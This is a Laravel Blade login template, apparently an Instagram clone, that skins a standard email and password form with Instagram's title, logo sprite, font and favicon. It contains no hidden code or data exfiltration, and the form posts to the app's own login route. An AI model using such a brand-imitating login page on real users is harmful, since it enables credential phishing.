<html>

<head>
    <title>Instagram Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">

    <link href="https://db.onlinewebfonts.com/c/6d32b8e06f40fb7698cfb714b9e7975d?family=Billabong+W00+Regular"
        rel="stylesheet">
    <link rel="shortcut icon" href="https://seeklogo.com/images/I/instagram-logo-1494D6FE63-seeklogo.com.png" type="image/x-icon">

</head>

</html>

<x-guest-layout>
    <div aria-disabled="false" role="button" tabindex="0" style="cursor: pointer;" class=" mb-3 text-center">
        <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/ys/r/WBLlWbPOKZ9.png&quot;); background-position: 0px 0px; background-size: 176px 264px; width: 174px; height: 50px; background-repeat: no-repeat; display: inline-block;"></i>
    </div>

    <!-- Session Status -->
    <x-auth-session-status class="mb-4" :status="session('status')" />

    <form method="POST" action="{{ route('login') }}">
        @csrf
        <!-- Email Address -->
        <div>
            {{-- <x-input-label for="email" :value="__('Email')" /> --}}
            <x-text-input id="email" class="block mt-1 w-full" type="email" name="email" :value="old('email')"
                required autofocus autocomplete="username" placeholder="Email" />
            <x-input-error :messages="$errors->get('email')" class="mt-2" />
        </div>

        <!-- Password -->
        <div class="mt-3">
            {{-- <x-input-label for="password" :value="__('Password')" /> --}}

            <x-text-input id="password" class="block mt-1 w-full" type="password" name="password" required
                autocomplete="current-password" placeholder="Password" />

            <x-input-error :messages="$errors->get('password')" class="mt-2" />
        </div>
        <div class="flex items-center justify-end mt-3">
            <x-primary-button class="">
                {{ __('Log in') }}
            </x-primary-button>
        </div>

        <div class="mt-1 text-center">
            @if (Route::has('password.request'))
                <a class=" text-muted text-decoration-none"
                    href="{{ route('password.request') }}">
                    {{ __('Forgot your password?') }}
                </a>
            @endif
        </div>

        <div class="mt-1 text-center  ">
            <a class=" text-muted text-decoration-none"
                href="{{ route('register') }}">
                Don't have an account? <span class="text-primary">Sign up</span>
            </a>
        </div>
    </form>
</x-guest-layout>
